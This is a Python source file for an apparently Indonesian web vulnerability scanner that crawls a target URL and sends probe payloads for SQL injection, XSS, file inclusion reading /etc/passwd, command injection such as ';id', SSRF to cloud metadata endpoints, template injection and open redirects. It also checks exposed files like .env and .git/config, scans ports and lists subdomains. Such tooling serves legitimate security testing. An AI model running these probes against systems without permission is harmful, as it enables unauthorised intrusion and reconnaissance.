#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                           REZZ - WEB VULNERABILITY SCANNER                    ║
║                              Version 3.0 - Enterprise Edition                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Fitur: SQLi, XSS, LFI/RFI, Command Injection, SSRF, SSTI, Open Redirect,   ║
║          Port Scanner, Subdomain Finder, Admin Panel Finder, Backup Finder   ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  ⚠️  DISCLAIMER:                                                              ║
║  Tools ini dibuat untuk tujuan PENGUJIAN KEAMANAN dan EDUKASI.               ║
║  Hanya gunakan pada website yang ANDA MILIKI atau memiliki IZIN TERTULIS.    ║
║  Saya sebagai DEVELOPER TIDAK BERTANGGUNG JAWAB atas penyalahgunaan tools ini.║
║  Penggunaan ilegal dapat dikenakan sanksi PIDANA sesuai UU ITE.              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import requests
import sys
import re
import time
import socket
import ssl
import json
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import hashlib
import threading

# Warna untuk output terminal
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class RezzScanner:
    def __init__(self, target):
        self.target = target if target.startswith(('http://', 'https://')) else 'http://' + target
        self.domain = urlparse(self.target).netloc
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.session.verify = False
        self.results = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'info': [],
            'errors': []
        }
        self.links = set()
        self.forms = []
        self.lock = threading.Lock()

    def log_vuln(self, name, url, payload, evidence, risk='High'):
        vuln = {
            'type': name,
            'url': url,
            'payload': payload,
            'evidence': evidence[:200],
            'risk': risk,
            'timestamp': datetime.now().isoformat()
        }
        with self.lock:
            self.results['vulnerabilities'].append(vuln)
        print(f"{Colors.RED}[!] {name}{Colors.END}")
        print(f"    URL: {url}")
        print(f"    Payload: {payload[:80]}")
        print(f"    Evidence: {evidence[:100]}...")
        print()

    def log_info(self, msg):
        with self.lock:
            self.results['info'].append(msg)
        print(f"{Colors.GREEN}[+] {msg}{Colors.END}")

    def log_error(self, msg):
        with self.lock:
            self.results['errors'].append(msg)
        print(f"{Colors.YELLOW}[-] {msg}{Colors.END}")

    def get(self, url, params=None, timeout=10):
        try:
            return self.session.get(url, params=params, timeout=timeout)
        except:
            return None

    def post(self, url, data=None, timeout=10):
        try:
            return self.session.post(url, data=data, timeout=timeout)
        except:
            return None

    # ==================== CRAWLER ====================
    def crawl(self, url, depth=2):
        if depth == 0 or len(self.links) > 200:
            return
        try:
            resp = self.get(url)
            if not resp or resp.status_code != 200:
                return
            self.links.add(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                href = link['href'].strip()
                full = urljoin(url, href)
                if urlparse(full).netloc == self.domain and full not in self.links:
                    self.crawl(full, depth-1)
            
            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').lower()
                inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                self.forms.append({
                    'action': urljoin(url, action) if action else url,
                    'method': method,
                    'inputs': inputs
                })
        except Exception as e:
            pass

    # ==================== SQL INJECTION ====================
    def test_sqli(self, url, param):
        sqli_payloads = [
            ("error", "'"),
            ("error", "\""),
            ("error", "' OR '1'='1"),
            ("error", "' OR '1'='1'--"),
            ("error", "1' AND '1'='1"),
            ("time", "' AND SLEEP(5)--"),
            ("time", "\" AND SLEEP(5)--"),
            ("union", "' UNION SELECT NULL--"),
            ("union", "' UNION SELECT NULL,NULL--"),
            ("union", "' UNION SELECT NULL,NULL,NULL--"),
        ]
        
        for method, payload in sqli_payloads:
            test_params = {param: payload}
            try:
                start = time.time()
                resp = self.get(url, test_params)
                if not resp:
                    continue
                elapsed = time.time() - start
                
                if method == "error":
                    error_patterns = ['mysql', 'sql', 'syntax', 'unexpected', 'sqlite', 'postgresql', 'oracle']
                    for pattern in error_patterns:
                        if pattern in resp.text.lower():
                            self.log_vuln(f"SQL Injection ({method}-based)", f"{url}?{param}={payload}", payload, f"Database error pattern: {pattern}")
                            return True
                
                if method == "time" and elapsed > 4.5:
                    self.log_vuln(f"SQL Injection (time-based)", f"{url}?{param}={payload}", payload, f"Delay: {elapsed:.2f}s")
                    return True
                    
            except:
                continue
        return False

    # ==================== XSS ====================
    def test_xss(self, url, param):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'\"><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params)
                if resp and payload in resp.text:
                    self.log_vuln("Cross-Site Scripting (XSS)", f"{url}?{param}={payload}", payload, "Payload reflected in response", "Medium")
                    return True
            except:
                continue
        return False

    # ==================== LFI ====================
    def test_lfi(self, url, param):
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
        ]
        
        for payload in lfi_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params)
                if resp:
                    if 'root:' in resp.text or 'daemon:' in resp.text:
                        self.log_vuln("Local File Inclusion (LFI)", f"{url}?{param}={payload}", payload, "Found /etc/passwd content", "Critical")
                        return True
                    if '[extensions]' in resp.text or 'windows' in resp.text.lower():
                        self.log_vuln("Local File Inclusion (LFI)", f"{url}?{param}={payload}", payload, "Found Windows config file", "Critical")
                        return True
            except:
                continue
        return False

    # ==================== COMMAND INJECTION ====================
    def test_cmd_injection(self, url, param):
        cmd_payloads = [
            ";ls",
            ";id",
            ";whoami",
            "|ls",
            "|id",
            "||dir",
            "&dir",
            ";echo test",
            "|echo test",
        ]
        
        for payload in cmd_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params)
                if resp:
                    patterns = ['uid=', 'gid=', 'groups=', 'root:', 'drwx', 'Volume Serial Number', 'Directory of']
                    for pattern in patterns:
                        if pattern in resp.text:
                            self.log_vuln("Command Injection", f"{url}?{param}={payload}", payload, f"Found command output: {pattern}", "Critical")
                            return True
            except:
                continue
        return False

    # ==================== SSRF ====================
    def test_ssrf(self, url, param):
        ssrf_payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/admin",
            "http://localhost:80",
            "https://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
        ]
        
        for payload in ssrf_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params)
                if resp:
                    if 'instance-id' in resp.text or 'ami-id' in resp.text:
                        self.log_vuln("Server-Side Request Forgery (SSRF)", f"{url}?{param}={payload}", payload, "Cloud metadata detected", "High")
                        return True
                    if 'root:' in resp.text:
                        self.log_vuln("Server-Side Request Forgery (SSRF)", f"{url}?{param}={payload}", payload, "Local file read via file://", "High")
                        return True
            except:
                continue
        return False

    # ==================== SSTI ====================
    def test_ssti(self, url, param):
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "{{7*'7'}}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${7*7}",
            "${{7*7}}",
        ]
        
        for payload in ssti_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params)
                if resp and '49' in resp.text and '7*7' not in resp.text:
                    self.log_vuln("Server-Side Template Injection (SSTI)", f"{url}?{param}={payload}", payload, "Arithmetic evaluation detected", "High")
                    return True
            except:
                continue
        return False

    # ==================== OPEN REDIRECT ====================
    def test_open_redirect(self, url, param):
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "//google.com",
            "https://google.com",
        ]
        
        for payload in redirect_payloads:
            test_params = {param: payload}
            try:
                resp = self.get(url, test_params, timeout=5)
                if resp and resp.status_code in [301, 302]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or 'google.com' in location:
                        self.log_vuln("Open Redirect", f"{url}?{param}={payload}", payload, f"Redirects to {location}", "Medium")
                        return True
            except:
                continue
        return False

    # ==================== SENSITIVE PATHS ====================
    def scan_sensitive_paths(self):
        paths = [
            '/admin', '/administrator', '/wp-admin', '/login', '/phpmyadmin', 
            '/.env', '/.git/config', '/backup.sql', '/database.sql', '/dump.sql',
            '/config.php', '/wp-config.php', '/robots.txt', '/sitemap.xml', 
            '/crossdomain.xml', '/phpinfo.php', '/info.php', '/server-status',
            '/backup.zip', '/backup.tar.gz', '/.htaccess', '/web.config', '/.git/HEAD'
        ]
        
        for path in paths:
            url = urljoin(self.target, path)
            try:
                resp = self.get(url)
                if resp and resp.status_code == 200:
                    evidence = f"Status {resp.status_code}"
                    if path in ['.env', '.git/config', 'config.php', 'wp-config.php']:
                        evidence = f"File accessible: {resp.text[:100]}"
                    self.log_vuln("Sensitive File/Directory", url, path, evidence, "High")
            except:
                continue

    # ==================== PORT SCANNER ====================
    def scan_ports(self):
        common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 443: 'HTTPS', 3306: 'MySQL', 5432: 'PostgreSQL',
            6379: 'Redis', 27017: 'MongoDB', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
            1433: 'MSSQL', 1521: 'Oracle'
        }
        
        open_ports = []
        for port, service in common_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((self.domain, port))
                sock.close()
                if result == 0:
                    open_ports.append((port, service))
                    self.log_info(f"Port {port} ({service}) is OPEN")
            except:
                continue
        
        if open_ports:
            self.results['open_ports'] = open_ports
        return open_ports

    # ==================== SUBDOMAIN SCANNER ====================
    def scan_subdomains(self):
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
            'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'admin', 'blog', 'dev',
            'staging', 'test', 'api', 'cdn', 'static', 'assets', 'img', 'images', 'video',
            'download', 'forum', 'shop', 'store', 'app', 'mobile', 'm'
        ]
        
        found = []
        for sub in subdomains:
            url = f"https://{sub}.{self.domain}"
            try:
                resp = self.get(url, timeout=5)
                if resp and resp.status_code < 400:
                    found.append(url)
                    self.log_info(f"Subdomain found: {url}")
            except:
                try:
                    url = f"http://{sub}.{self.domain}"
                    resp = self.get(url, timeout=5)
                    if resp and resp.status_code < 400:
                        found.append(url)
                        self.log_info(f"Subdomain found: {url}")
                except:
                    continue
        return found

    # ==================== HEADER SECURITY CHECK ====================
    def check_security_headers(self):
        try:
            resp = self.get(self.target)
            if not resp:
                return
            
            security_headers = {
                'X-Frame-Options': 'Missing - Clickjacking risk',
                'X-XSS-Protection': 'Missing - XSS risk',
                'X-Content-Type-Options': 'Missing - MIME sniffing risk',
                'Content-Security-Policy': 'Missing - XSS/data injection risk',
                'Strict-Transport-Security': 'Missing - Protocol downgrade risk',
                'Referrer-Policy': 'Missing - Information leak risk',
            }
            
            for header, risk in security_headers.items():
                if header not in resp.headers:
                    self.log_vuln("Missing Security Header", self.target, header, risk, "Medium")
        except:
            pass

    # ==================== RUN SCAN ====================
    def run(self):
        print(f"{Colors.BOLD}{Colors.HEADER}")
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                           REZZ - WEB VULNERABILITY SCANNER                    ║")
        print("║                                     v3.0                                      ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.END}")
        print(f"{Colors.CYAN}Target: {self.target}{Colors.END}")
        print(f"{Colors.CYAN}Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")
        
        print(f"{Colors.YELLOW}[*] Starting crawl...{Colors.END}")
        self.crawl(self.target)
        self.log_info(f"Found {len(self.links)} URLs and {len(self.forms)} forms")
        
        print(f"{Colors.YELLOW}[*] Testing for vulnerabilities...{Colors.END}")
        
        # Test each parameter for vulnerabilities
        for url in list(self.links)[:100]:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            if params:
                for param in list(params.keys())[:10]:
                    self.test_sqli(url, param)
                    self.test_xss(url, param)
                    self.test_lfi(url, param)
                    self.test_cmd_injection(url, param)
                    self.test_ssrf(url, param)
                    self.test_ssti(url, param)
                    self.test_open_redirect(url, param)
        
        # Test forms
        for form in self.forms[:30]:
            for inp in form['inputs'][:5]:
                self.test_sqli(form['action'], inp)
                self.test_xss(form['action'], inp)
        
        print(f"{Colors.YELLOW}[*] Scanning sensitive paths...{Colors.END}")
        self.scan_sensitive_paths()
        
        print(f"{Colors.YELLOW}[*] Scanning ports on {self.domain}...{Colors.END}")
        self.scan_ports()
        
        print(f"{Colors.YELLOW}[*] Scanning subdomains...{Colors.END}")
        self.scan_subdomains()
        
        print(f"{Colors.YELLOW}[*] Checking security headers...{Colors.END}")
        self.check_security_headers()
        
        # Summary
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║                              SCAN COMPLETE                                     ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.CYAN}Summary:{Colors.END}")
        print(f"  - Total URLs scanned: {len(self.links)}")
        print(f"  - Total forms found: {len(self.forms)}")
        print(f"  - Vulnerabilities found: {len(self.results['vulnerabilities'])}")
        
        # Save report
        report_file = f"scan_report_{hashlib.md5(self.target.encode()).hexdigest()[:8]}.json"
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n{Colors.GREEN}[+] Full report saved to: {report_file}{Colors.END}")
        
        if self.results['vulnerabilities']:
            print(f"\n{Colors.RED}[!] DISCLAIMER: These vulnerabilities should only be tested on your own systems.{Colors.END}")

def main():
    if len(sys.argv) < 2:
        print(f"{Colors.RED}Usage: python scanner.py <target_url>{Colors.END}")
        print(f"{Colors.CYAN}Example: python scanner.py https://example.com{Colors.END}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"{Colors.YELLOW}")
    print("╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║                           DISCLAIMER                                         ║")
    print("╠══════════════════════════════════════════════════════════════════════════════╣")
    print("║  Tools ini dibuat untuk tujuan PENGUJIAN KEAMANAN dan EDUKASI.               ║")
    print("║  Hanya gunakan pada website yang ANDA MILIKI atau memiliki IZIN TERTULIS.    ║")
    print("║                                                                              ║")
    print("║  Saya sebagai DEVELOPER TIDAK BERTANGGUNG JAWAB atas penyalahgunaan tools ini.║")
    print("║  Tools ini di rancang testing ringan, Silahkan modif sendiri scrip ini free. ║")
    print("║                                                                              ║")
    print("║  Dengan menggunakan tools ini, Anda menyetujui disclaimer di atas.           ║")
    print("╚══════════════════════════════════════════════════════════════════════════════╝")
    print(f"{Colors.END}")
    
    confirm = input(f"{Colors.YELLOW}Type 'YES' to continue: {Colors.END}")
    if confirm != 'YES':
        print("Exiting...")
        sys.exit(0)
    
    scanner = RezzScanner(target)
    scanner.run()

if __name__ == "__main__":
    main()
